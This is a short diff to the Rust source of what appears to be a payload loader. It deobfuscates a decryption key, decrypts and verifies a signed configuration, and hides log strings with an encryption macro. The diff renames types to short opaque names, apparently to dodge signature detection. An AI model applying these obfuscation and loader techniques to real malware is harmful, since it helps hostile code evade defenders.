@@ -1,6 +1,6 @@
-use crate::config::Config;
+use crate::config::CCC;
 use crate::dataoperation::un_apply_all_dataoperations;
-use crate::dataoperation::DataOperation;
+use crate::dataoperation::DO;
 use crate::payload::PO;
 //use crate::payload_util::print_running_thread;
 //use crate::payload_util::print_runonce;
@@ -61,15 +61,15 @@ pub fn run_loader() {
     let obfuscated_config_decrypt_key = OBFUSCATED_CONFIG_DECRYPT_KEY.to_vec();
     let decrypt_key_obfuscation_steps_zlib = DECRYPT_KEY_OBFUSCATION_STEPS.to_vec();
     let decrypt_key_obfuscation_steps = un_apply_all_dataoperations(
-        vec![DataOperation::ZLIB],
+        vec![DO::ZLIB],
         decrypt_key_obfuscation_steps_zlib,
     )
     .unwrap();
-    let ope_for_data_op: Vec<DataOperation> =
+    let ope_for_data_op: Vec<DO> =
         serde_json::from_slice(decrypt_key_obfuscation_steps.as_slice()).unwrap();
     let initial_config_decrypt_key =
         un_apply_all_dataoperations(ope_for_data_op, obfuscated_config_decrypt_key).unwrap();
-    let initial_config_decrypt_key_dataoperation: Vec<DataOperation> =
+    let initial_config_decrypt_key_dataoperation: Vec<DO> =
         serde_json::from_slice(initial_config_decrypt_key.as_slice()).unwrap();
 
     info!("{}", encrypt_string!("[+] DECRYPT initial config"));
@@ -80,7 +80,7 @@ pub fn run_loader() {
     .unwrap();
     info!("{}", encrypt_string!("[+] DECRYPTED!"));
 
-    let mut config: Config = serde_json::from_slice(initial_config_decrypted.as_slice()).unwrap();
+    let mut config: CCC = serde_json::from_slice(initial_config_decrypted.as_slice()).unwrap();
     info!("{}", encrypt_string!("[+] VERIFY initial config"));
     config.verify_newconfig_signature(&config).unwrap();
     info!("{}{}", encrypt_string!("[+] VERIFIED!"), "\n");
